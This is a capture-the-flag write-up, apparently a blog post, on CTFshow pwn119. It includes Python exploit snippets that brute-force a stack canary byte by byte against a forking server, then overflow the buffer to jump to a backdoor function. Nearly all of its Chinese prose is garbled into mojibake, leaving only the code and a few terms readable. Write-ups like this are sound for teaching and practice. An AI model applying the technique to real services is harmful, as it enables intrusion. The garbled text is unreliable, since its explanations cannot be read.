---
title: CTFshow pwn119 fork 鐖嗙牬 Canary
published: 2026-04-17
updated: 2026-04-17
description: 瀛愯繘绋嬪穿婧冧笉浼氬奖鍝嶇埗杩涚▼锛屼簬鏄彲浠ユ寜瀛楄妭鐖嗙牬 canary锛屾渶鍚庡啀琛ュ畬鏁?payload 杩涘悗闂ㄣ€
tags: [CTFshow, Pwn, Stack, Canary, Brute Force, Fork]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

杩欓鐨勬牳蹇冧笉鏄牸寮忓寲瀛楃涓诧紝鑰屾槸 `fork`銆?
鏈嶅姟绔瘡娆¤瀛愯繘绋嬪鐞嗚緭鍏ワ紝瀛愯繘绋嬪洜涓?canary 閿欒宕╂帀鏃讹紝鐖惰繘绋嬭繕娲荤潃锛屾墍浠ユ垜浠彲浠ヤ竴瀛楄妭涓€瀛楄妭璇曟帰 canary銆傚彧瑕佸洖鏄鹃噷娌℃湁鍑虹幇 `stack smashing detected`锛屽氨璇存槑褰撳墠瀛楄妭鐚滃浜嗐€?
## 鍒╃敤鎬濊矾

1. canary 绗竴瀛楄妭鍥哄畾鏄?`0x00`
2. 閫愬瓧鑺備粠 `0x00` 鍒?`0xff` 璇曟帰
3. 鏌愪竴瀛楄妭鐚滃鏃讹紝鏈嶅姟涓嶄細绔嬪埢鎶?stack smashing
4. 鎷煎嚭瀹屾暣 canary 鍚庯紝姝ｅ父瑕嗙洊杩斿洖鍦板潃

## 鍏抽敭 exp 鐗囨

```python
canary = b'\x00'
for i in range(3):
    for j in range(0, 256):
        payload = b'a' * (0x70 - 0xC) + canary + p8(j)
        io.send(payload)
        text = io.recv()
        if b"stack smashing detected" not in text:
            canary += p8(j)
            break
```

```python
payload = b'a' * (0x70 - 0xc) + canary + b'a' * 0xc + p32(backdoor)
io.send(payload)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn119/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn119/exp.py)
- [涓嬭浇鍘熷绗旇 `Bypass_pwn119.md`](../../attachments/ctfshow/pwn119/Bypass_pwn119.md)

## 閫傚悎璁颁綇鐨勭偣

鐪嬪埌 `fork` / `accept -> fork` 杩欑被鏈嶅姟绔ā鍨嬫椂锛岃绔嬪埢鑱旀兂鍒?canary 鐖嗙牬銆丄SLR 鐖嗙牬鍜岄€愬瓧鑺傝瘯鎺€?

